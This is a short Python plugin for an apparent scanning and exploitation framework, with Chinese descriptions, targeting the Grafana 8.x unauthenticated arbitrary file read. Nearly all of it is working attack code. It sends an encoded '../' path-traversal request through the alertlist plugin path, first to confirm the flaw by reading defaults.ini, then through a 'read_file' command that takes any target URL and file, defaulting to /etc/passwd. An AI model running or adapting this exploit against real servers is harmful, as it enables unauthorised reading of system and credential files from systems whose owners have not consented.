# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "Grafana未授权访问任意文件读取漏洞",
        "description": "Grafana 8.x版本存在未授权任意文件读取漏洞，攻击者在未经身份验证的情况下可通过默认存在的插件，构造特殊的请求包读取服务器任意文件。",
    }

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./public/plugins/alertlist/markdown/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/conf/defaults.ini',
            timeout=15
        )
        if r.status_code == 200 and 'Grafana Configuration Defaults' in r.text:
            return {
                "LoopholeInfo": {"app": "Grafana", "name": "Grafana未授权访问任意文件读取漏洞"}
            }

    @cli.command(description='读取系统文件')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("file", help="读取的文件", default="/etc/passwd")
    def read_file(self, url, file):
        r = self.request(
            method='get',
            url=urllib.parse.urljoin(
                url,
                f'./public/plugins/alertlist/markdown/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E{file}'
            ),
            timeout=15
        )
        if r.status_code == 200:
            self.log.success(f'读取文件成功:\n{r.text}')
        else:
            self.log.failure('读取文件失败')
